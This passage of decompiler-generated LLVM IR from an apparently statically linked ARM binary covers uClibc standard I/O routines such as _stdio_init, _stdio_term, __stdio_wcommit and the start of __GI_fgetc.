  %v7_14a54 = icmp slt i32 %v1_14a48, 2
  br i1 %v7_14a54, label %dec_label_pc_14a78, label %dec_label_pc_14a58

dec_label_pc_14a58:                               ; preds = %dec_label_pc_14a50
  %v0_14a58 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_14a58, i32* %r0.global-to-local, align 4
  %v0_14a5c = load i32, i32* @r1, align 4
  %v1_14a5c = add i32 %v0_14a5c, 129
  store i32 %v1_14a5c, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14a78

dec_label_pc_14a74:                               ; preds = %dec_label_pc_146b8, %dec_label_pc_1469c, %dec_label_pc_146c4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_14a78

dec_label_pc_14a78:                               ; preds = %dec_label_pc_149f4, %dec_label_pc_14a50, %bb57, %dec_label_pc_146fc, %dec_label_pc_14a58, %dec_label_pc_14a74
  %v0_14a78 = load i32, i32* @r5, align 4
  store i32 %v0_14a78, i32* %r0.global-to-local, align 4
  %v2_14a80 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14a80, i32* %r4.global-to-local, align 4
  store i32 %v6_1465c, i32* @r5, align 4
  store i32 %v9_1465c, i32* @r6, align 4
  store i32 %v12_1465c, i32* @r7, align 4
  store i32 %v15_1465c, i32* @r8, align 4
  ret i32 %v0_14a78

; uselistorder directives
  uselistorder i32 %v0_14a44, { 1, 0, 2 }
  uselistorder i32 %v1_14a28.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14a18, { 1, 0 }
  uselistorder i32 %v0_149c8, { 1, 0, 2 }
  uselistorder i32 %v1_149ac.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1499c, { 1, 0 }
  uselistorder i32 %v0_14944, { 1, 0, 2 }
  uselistorder i32 %v1_14928.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_148dc, { 1, 0, 2 }
  uselistorder i32 %v1_148c0, { 0, 2, 1 }
  uselistorder i32 %v4_1489c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1484c.pre, { 2, 1, 0 }
  uselistorder i32 %v0_147d0, { 1, 2, 0 }
  uselistorder i32 %v1_14760, { 1, 0 }
  uselistorder i32 %v0_14760, { 1, 0 }
  uselistorder i32 %v1_14748, { 1, 2, 0, 3 }
  uselistorder i32 %v1_146ec, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 51, 5, 6, 7, 8, 9, 11, 10, 52, 13, 12, 14, 15, 16, 17, 18, 19, 21, 20, 53, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0, 49, 50 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 25, 22, 23, 24, 26, 27, 28 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 32, 33, 3, 4, 5, 6, 34, 35, 7, 8, 9, 36, 37, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 16384, { 67, 68, 69, 0, 1, 32, 60, 33, 61, 34, 62, 35, 63, 36, 64, 37, 65, 15, 66, 2, 44, 28, 48, 29, 49, 27, 45, 30, 46, 31, 47, 3, 50, 4, 51, 5, 52, 6, 53, 7, 54, 8, 55, 9, 56, 10, 57, 11, 58, 12, 59, 38, 70, 13, 71, 14, 72, 17, 73, 40, 74, 41, 75, 42, 76, 16, 77, 39, 78, 79, 18, 80, 19, 81, 20, 82, 43, 83, 21, 84, 22, 85, 24, 86, 23, 87, 25, 88, 26, 89 }
  uselistorder i32 (i32, i64*)* @__libc_open, { 0, 4, 1, 2, 3 }
  uselistorder i32 131072, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 12, 3, 0, 9, 8, 11, 10, 7, 6, 5, 4, 2, 1 }
  uselistorder i32 ()* @malloc, { 31, 30, 5, 29, 4, 3, 2, 0, 1, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 ()* @free, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_14a78, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_14a74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14a48, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14a30, { 1, 0 }
  uselistorder label %dec_label_pc_149f4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_149cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_149b4, { 1, 0 }
  uselistorder label %dec_label_pc_14958, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_14948, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14930, { 1, 0 }
  uselistorder label %dec_label_pc_148f0, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_148e0, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14828, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_14790._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_14738, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_146d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1469c, { 1, 2, 0 }
}

define i32 @function_14a8c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14a8c:
  %v0_14a8c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14a8c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_14a8c
  %v5_14a8c = sdiv i32 %arg2, 16
  %v6_14a8c = and i32 %v5_14a8c, %arg1
  %v5_14a90 = sdiv i32 %arg2, 256
  %v6_14a90 = and i32 %v6_14a8c, %v5_14a90
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14a8c, %bb
  %v7_14a94 = phi i32 [ %arg1, %dec_label_pc_14a8c ], [ %v6_14a90, %bb ]
  ret i32 %v7_14a94

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_14ac4 = call i32 @__aeabi_read_tp()
  %v3_14ac8 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_14ac8 = sext i16 %v3_14ac8 to i32
  store i32 %v4_14ac8, i32* @r3, align 4
  store i32 %v0_14ac4, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_14ad4 = add i32 %v4_14ac8, %v0_14ac4
  %v3_14ad4 = inttoptr i32 %v2_14ad4 to i32*
  %v4_14ad4 = load i32, i32* %v3_14ad4, align 4
  store i32 %v4_14ad4, i32* @r6, align 4
  %v1_14ad8 = call i32 @isatty(i32 0)
  %v2_14ae0 = icmp eq i32 %v1_14ad8, 0
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* @r4, align 4
  br i1 %v2_14ae0, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_14aec = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 308) to i16*), align 4
  %v7_14aec = zext i16 %v5_14aec to i32
  %v2_14af0 = xor i32 %v7_14aec, 256
  store i32 %v2_14af0, i32* @r3, align 4
  %v2_14af4 = trunc i32 %v2_14af0 to i16
  store i16 %v2_14af4, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 308) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_14afc = call i32 @isatty(i32 1)
  %v2_14b00 = icmp eq i32 %v1_14afc, 0
  br i1 %v2_14b00, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_14b08 = load i32, i32* @r4, align 4
  %v2_14b0c = add i32 %v1_14b08, 376
  %v3_14b0c = inttoptr i32 %v2_14b0c to i16*
  %v4_14b0c = load i16, i16* %v3_14b0c, align 2
  %v2_14b10 = xor i16 %v4_14b0c, 256
  store i16 %v2_14b10, i16* %v3_14b0c, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_14b1c = load i16, i16* @global_var_20d4c.598, align 2
  %v4_14b1c = sext i16 %v3_14b1c to i32
  %v0_14b20 = load i32, i32* @r6, align 4
  %v1_14b20 = load i32, i32* @r5, align 4
  %v3_14b20 = add i32 %v1_14b20, %v4_14b1c
  %v4_14b20 = inttoptr i32 %v3_14b20 to i32*
  store i32 %v0_14b20, i32* %v4_14b20, align 4
  ret i32 %v1_14afc

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_14b3c = load i32, i32* @r4, align 4
  store i32 %v3_14b3c, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 -33100), i32* %r3.global-to-local, align 4
  %v2_14b50 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 -33100) to i32*), align 4
  store i32 %v2_14b50, i32* %r0.global-to-local, align 4
  %v5_14b50 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 -33096) to i32*), align 4
  store i32 %v5_14b50, i32* %r1.global-to-local, align 4
  %v8_14b50 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 -33092) to i32*), align 4
  %v2_14b58 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_14b58, i32* %r3.global-to-local, align 4
  store i32 %v2_14b50, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_14b64 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 152) to i32*), align 4
  store i32 %v2_14b50, i32* %r0.global-to-local, align 4
  store i32 %v5_14b50, i32* %r1.global-to-local, align 4
  store i32 %v8_14b50, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 -33112), i32* %r3.global-to-local, align 4
  %v1_14b74 = inttoptr i32 %v4_14b64 to i32*
  store i32 %v2_14b50, i32* %v1_14b74, align 4
  %v3_14b74 = add i32 %v4_14b64, 4
  %v4_14b74 = inttoptr i32 %v3_14b74 to i32*
  %v5_14b74 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14b74, i32* %v4_14b74, align 4
  %v6_14b74 = add i32 %v4_14b64, 8
  %v7_14b74 = inttoptr i32 %v6_14b74 to i32*
  %v8_14b74 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_14b74, i32* %v7_14b74, align 4
  %v0_14b78 = load i32, i32* %r3.global-to-local, align 4
  %v1_14b78 = inttoptr i32 %v0_14b78 to i32*
  %v2_14b78 = load i32, i32* %v1_14b78, align 4
  store i32 %v2_14b78, i32* %r0.global-to-local, align 4
  %v3_14b78 = add i32 %v0_14b78, 4
  %v4_14b78 = inttoptr i32 %v3_14b78 to i32*
  %v5_14b78 = load i32, i32* %v4_14b78, align 4
  store i32 %v5_14b78, i32* %r1.global-to-local, align 4
  %v6_14b78 = add i32 %v0_14b78, 8
  %v7_14b78 = inttoptr i32 %v6_14b78 to i32*
  %v8_14b78 = load i32, i32* %v7_14b78, align 4
  %v2_14b7c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_14b7c, i32* %r3.global-to-local, align 4
  store i32 %v2_14b78, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_14b88 = load i32, i32* %r7.global-to-local, align 4
  %v2_14b88 = add i32 %v0_14b88, 76
  %v3_14b88 = inttoptr i32 %v2_14b88 to i32*
  %v4_14b88 = load i32, i32* %v3_14b88, align 4
  store i32 %v4_14b88, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_14b90 = inttoptr i32 %v4_14b88 to i32*
  %v2_14b90 = load i32, i32* %v1_14b90, align 4
  store i32 %v2_14b90, i32* %r5.global-to-local, align 4
  %v2_14b94 = add i32 %v0_14b88, 160
  %v3_14b94 = inttoptr i32 %v2_14b94 to i32*
  %v4_14b94 = load i32, i32* %v3_14b94, align 4
  store i32 %v2_14b78, i32* %r0.global-to-local, align 4
  store i32 %v5_14b78, i32* %r1.global-to-local, align 4
  store i32 %v8_14b78, i32* %r2.global-to-local, align 4
  store i32 -33124, i32* %r3.global-to-local, align 4
  %v2_14ba4 = add i32 %v0_14b88, -33124
  store i32 %v2_14ba4, i32* %sl.global-to-local, align 4
  %v1_14ba8 = inttoptr i32 %v4_14b94 to i32*
  store i32 %v2_14b78, i32* %v1_14ba8, align 4
  %v3_14ba8 = add i32 %v4_14b94, 4
  %v4_14ba8 = inttoptr i32 %v3_14ba8 to i32*
  %v5_14ba8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14ba8, i32* %v4_14ba8, align 4
  %v6_14ba8 = add i32 %v4_14b94, 8
  %v7_14ba8 = inttoptr i32 %v6_14ba8 to i32*
  %v8_14ba8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_14ba8, i32* %v7_14ba8, align 4
  %v0_14c38.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14c3816 = icmp eq i32 %v0_14c38.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_14c4018 = add i32 %v0_14c38.pr, 56
  store i32 %v1_14c4018, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_14c3816, label %dec_label_pc_14c4c, label %dec_label_pc_14bb0

dec_label_pc_14bb0:                               ; preds = %entry, %.thread10
  %v0_14bb0 = phi i32 [ %v3_14c34, %.thread10 ], [ %v0_14c38.pr, %entry ]
  %v1_14bb0 = add i32 %v0_14bb0, 64
  %v2_14bb0 = inttoptr i32 %v1_14bb0 to i32*
  %v3_14bb0 = load i32, i32* %v2_14bb0, align 4
  store i32 %v3_14bb0, i32* %r3.global-to-local, align 4
  %v0_14bb4 = call i32 @__aeabi_read_tp()
  store i32 %v0_14bb4, i32* %r0.global-to-local, align 4
  %v1_14bb8 = add i32 %v0_14bb4, -1168
  store i32 %v1_14bb8, i32* %r6.global-to-local, align 4
  %v3_14bbc = icmp uge i32 %v3_14bb0, %v1_14bb8
  store i1 %v3_14bbc, i1* %cpsr_c.global-to-local, align 1
  %v9_14bbc = icmp eq i32 %v3_14bb0, %v1_14bb8
  br i1 %v9_14bbc, label %.thread1, label %dec_label_pc_14bd0

.thread1:                                         ; preds = %dec_label_pc_14bb0
  %v1_14bc0 = load i32, i32* %r5.global-to-local, align 4
  %v2_14bc0 = add i32 %v1_14bc0, 60
  %v3_14bc0 = inttoptr i32 %v2_14bc0 to i32*
  %v4_14bc0 = load i32, i32* %v3_14bc0, align 4
  %v2_14bc4 = add i32 %v4_14bc0, 1
  store i32 %v2_14bc4, i32* %r3.global-to-local, align 4
  store i32 %v2_14bc4, i32* %v3_14bc0, align 4
  br label %.thread10

dec_label_pc_14bd0:                               ; preds = %dec_label_pc_14bb0, %dec_label_pc_14bdc
  %v0_14bd0 = load i32, i32* %r2.global-to-local, align 4
  %v1_14bd0 = inttoptr i32 %v0_14bd0 to i32*
  %v2_14bd0 = load i32, i32* %v1_14bd0, align 4
  store i32 %v2_14bd0, i32* %r3.global-to-local, align 4
  %v1_14bd4 = load i32, i32* %r4.global-to-local, align 4
  %v3_14bd4 = icmp uge i32 %v2_14bd0, %v1_14bd4
  store i1 %v3_14bd4, i1* %cpsr_c.global-to-local, align 1
  %v9_14bd4 = icmp eq i32 %v2_14bd0, %v1_14bd4
  br i1 %v9_14bd4, label %dec_label_pc_14bdc, label %dec_label_pc_14bf4

dec_label_pc_14bdc:                               ; preds = %dec_label_pc_14bd0
  store i32 %v2_14bd0, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14bec = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14bec, label %dec_label_pc_14bf0, label %dec_label_pc_14bd0

dec_label_pc_14bf0:                               ; preds = %dec_label_pc_14bdc
  %v0_14bf0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14bf0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14bf4

dec_label_pc_14bf4:                               ; preds = %dec_label_pc_14bd0, %dec_label_pc_14bf0
  %v0_14bf4 = phi i32 [ %v0_14bf0, %dec_label_pc_14bf0 ], [ %v2_14bd0, %dec_label_pc_14bd0 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14bf4 = icmp eq i32 %v0_14bf4, 0
  %v2_14c00.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_14bf4, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_14bf4
  %v1_14c00 = load i32, i32* %r6.global-to-local, align 4
  %v3_14c00 = add i32 %v2_14c00.pre, 64
  %v4_14c00 = inttoptr i32 %v3_14c00 to i32*
  store i32 %v1_14c00, i32* %v4_14c00, align 4
  %v1_14c04 = load i32, i32* %r1.global-to-local, align 4
  %v2_14c04 = load i32, i32* %r5.global-to-local, align 4
  %v3_14c04 = add i32 %v2_14c04, 60
  %v4_14c04 = inttoptr i32 %v3_14c04 to i32*
  store i32 %v1_14c04, i32* %v4_14c04, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_14bf4
  %v2_14bf8 = add i32 %v2_14c00.pre, 8
  %v3_14bf8 = inttoptr i32 %v2_14bf8 to i32*
  %v4_14bf8 = load i32, i32* %v3_14bf8, align 4
  store i32 %v4_14bf8, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_14c08 = add i32 %v2_14c00.pre, 20
  %v4_14c08 = inttoptr i32 %v3_14c08 to i32*
  store i32 %v4_14bf8, i32* %v4_14c08, align 4
  %v1_14c0c = load i32, i32* %r2.global-to-local, align 4
  %v2_14c0c = trunc i32 %v1_14c0c to i16
  %v3_14c0c = load i32, i32* %r5.global-to-local, align 4
  %v4_14c0c = inttoptr i32 %v3_14c0c to i16*
  store i16 %v2_14c0c, i16* %v4_14c0c, align 2
  %v1_14c10 = load i32, i32* %r3.global-to-local, align 4
  %v2_14c10 = load i32, i32* %r5.global-to-local, align 4
  %v3_14c10 = add i32 %v2_14c10, 24
  %v4_14c10 = inttoptr i32 %v3_14c10 to i32*
  store i32 %v1_14c10, i32* %v4_14c10, align 4
  %v1_14c14 = load i32, i32* %r3.global-to-local, align 4
  %v2_14c14 = load i32, i32* %r5.global-to-local, align 4
  %v3_14c14 = add i32 %v2_14c14, 28
  %v4_14c14 = inttoptr i32 %v3_14c14 to i32*
  store i32 %v1_14c14, i32* %v4_14c14, align 4
  %v1_14c18 = load i32, i32* %r3.global-to-local, align 4
  %v2_14c18 = load i32, i32* %r5.global-to-local, align 4
  %v3_14c18 = add i32 %v2_14c18, 16
  %v4_14c18 = inttoptr i32 %v3_14c18 to i32*
  store i32 %v1_14c18, i32* %v4_14c18, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_14c1c = load i32, i32* %sl.global-to-local, align 4
  %v1_14c1c = inttoptr i32 %v0_14c1c to i32*
  %v2_14c1c = load i32, i32* %v1_14c1c, align 4
  store i32 %v2_14c1c, i32* %r0.global-to-local, align 4
  %v3_14c1c = add i32 %v0_14c1c, 4
  %v4_14c1c = inttoptr i32 %v3_14c1c to i32*
  %v5_14c1c = load i32, i32* %v4_14c1c, align 4
  store i32 %v5_14c1c, i32* %r1.global-to-local, align 4
  %v6_14c1c = add i32 %v0_14c1c, 8
  %v7_14c1c = inttoptr i32 %v6_14c1c to i32*
  %v8_14c1c = load i32, i32* %v7_14c1c, align 4
  store i32 %v8_14c1c, i32* %r2.global-to-local, align 4
  %v1_14c24 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c24 = add i32 %v1_14c24, 52
  %v3_14c24 = inttoptr i32 %v2_14c24 to i32*
  store i32 1, i32* %v3_14c24, align 4
  %v0_14c28 = load i32, i32* %r5.global-to-local, align 4
  %v1_14c28 = add i32 %v0_14c28, 56
  store i32 %v1_14c28, i32* %r3.global-to-local, align 4
  %v2_14c2c = load i32, i32* %r0.global-to-local, align 4
  %v1_14c30 = inttoptr i32 %v1_14c28 to i32*
  store i32 %v2_14c2c, i32* %v1_14c30, align 4
  %v3_14c30 = add i32 %v0_14c28, 60
  %v4_14c30 = inttoptr i32 %v3_14c30 to i32*
  %v5_14c30 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14c30, i32* %v4_14c30, align 4
  %v6_14c30 = add i32 %v0_14c28, 64
  %v7_14c30 = inttoptr i32 %v6_14c30 to i32*
  %v8_14c30 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_14c30, i32* %v7_14c30, align 4
  %v0_14c34 = load i32, i32* %r5.global-to-local, align 4
  %v1_14c34 = add i32 %v0_14c34, 32
  %v2_14c34 = inttoptr i32 %v1_14c34 to i32*
  %v3_14c34 = load i32, i32* %v2_14c34, align 4
  store i32 %v3_14c34, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14c38 = icmp eq i32 %v3_14c34, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_14c40 = add i32 %v3_14c34, 56
  store i32 %v1_14c40, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_14c38, label %dec_label_pc_14c4c, label %dec_label_pc_14bb0

dec_label_pc_14c4c:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_14c50 = load i32, i32* %r7.global-to-local, align 4
  %v2_14c50 = add i32 %v0_14c50, 76
  %v3_14c50 = inttoptr i32 %v2_14c50 to i32*
  %v4_14c50 = load i32, i32* %v3_14c50, align 4
  store i32 %v4_14c50, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_14c50 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14c7014 = icmp eq i32 %storemerge12, 0
  br i1 %v2_14c7014, label %dec_label_pc_14c78, label %dec_label_pc_14c5c

dec_label_pc_14c5c:                               ; preds = %dec_label_pc_14c4c, %dec_label_pc_14c70
  %v1_14c64 = phi i32 [ %storemerge, %dec_label_pc_14c70 ], [ %storemerge12, %dec_label_pc_14c4c ]
  %v1_14c5c = inttoptr i32 %v1_14c64 to i16*
  %v2_14c5c = load i16, i16* %v1_14c5c, align 2
  %v3_14c5c = zext i16 %v2_14c5c to i32
  store i32 %v3_14c5c, i32* %r3.global-to-local, align 4
  %v1_14c60 = and i32 %v3_14c5c, 64
  %v2_14c60 = icmp eq i32 %v1_14c60, 0
  br i1 %v2_14c60, label %dec_label_pc_14c70, label %bb39

bb39:                                             ; preds = %dec_label_pc_14c5c
  store i32 %v1_14c64, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14c70

dec_label_pc_14c70:                               ; preds = %dec_label_pc_14c5c, %bb39
  %v1_14c68 = xor i1 %v2_14c60, true
  call void @__pseudo_cond_branch(i1 %v1_14c68, i32 ptrtoint (i32* @global_var_14ca0.871 to i32))
  %v0_14c6c = load i32, i32* %r4.global-to-local, align 4
  %v1_14c6c = add i32 %v0_14c6c, 32
  %storemerge.in = inttoptr i32 %v1_14c6c to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14c70 = icmp eq i32 %storemerge, 0
  br i1 %v2_14c70, label %dec_label_pc_14c78, label %dec_label_pc_14c5c

dec_label_pc_14c78:                               ; preds = %dec_label_pc_14c70, %dec_label_pc_14c4c
  %v2_14c7c = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_14c7c, i32* %r4.global-to-local, align 4
  %v1_14c80 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_14c80

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_14c34, { 1, 2, 3, 0 }
  uselistorder i32 %v1_14bd4, { 1, 0 }
  uselistorder i32 %v4_14b94, { 2, 1, 0 }
  uselistorder i32 %v4_14b64, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 6, 1, 2, 3, 4, 5, 0, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1, 10, 11, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 7, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_14c70, { 1, 0 }
  uselistorder label %dec_label_pc_14c5c, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14bf4, { 1, 0 }
  uselistorder label %dec_label_pc_14bd0, { 1, 0 }
  uselistorder label %dec_label_pc_14bb0, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14ca0 = load i32, i32* @r4, align 4
  store i32 %v3_14ca0, i32* %stack_var_-8, align 4
  %v1_14ca4 = add i32 %arg1, 8
  %v2_14ca4 = inttoptr i32 %v1_14ca4 to i32*
  %v3_14ca4 = load i32, i32* %v2_14ca4, align 4
  store i32 %v3_14ca4, i32* @r1, align 4
  %v1_14ca8 = add i32 %arg1, 16
  %v2_14ca8 = inttoptr i32 %v1_14ca8 to i32*
  %v3_14ca8 = load i32, i32* %v2_14ca8, align 4
  %v9_14cac = icmp eq i32 %v3_14ca8, %v3_14ca4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_14cac, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_14ca4, i32* %v2_14ca8, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_14cb8 = xor i1 %v9_14cac, true
  call void @__pseudo_cond_branch(i1 %v1_14cb8, i32 ptrtoint (i32* @global_var_16914.872 to i32))
  %v0_14cbc = load i32, i32* %r4.global-to-local, align 4
  %v1_14cbc = add i32 %v0_14cbc, 8
  %v2_14cbc = inttoptr i32 %v1_14cbc to i32*
  %v3_14cbc = load i32, i32* %v2_14cbc, align 4
  %v1_14cc0 = add i32 %v0_14cbc, 16
  %v2_14cc0 = inttoptr i32 %v1_14cc0 to i32*
  %v3_14cc0 = load i32, i32* %v2_14cc0, align 4
  %v2_14cc4 = sub i32 %v3_14cc0, %v3_14cbc
  %v2_14cc8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14cc8, i32* @r4, align 4
  ret i32 %v2_14cc4

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14cd0 = load i32, i32* @r4, align 4
  store i32 %v3_14cd0, i32* %stack_var_-20, align 4
  %v6_14cd0 = load i32, i32* @r5, align 4
  %v9_14cd0 = load i32, i32* @r6, align 4
  %v12_14cd0 = load i32, i32* @r7, align 4
  %v15_14cd0 = load i32, i32* @lr, align 4
  %v1_14cd4 = add i32 %arg1, 52
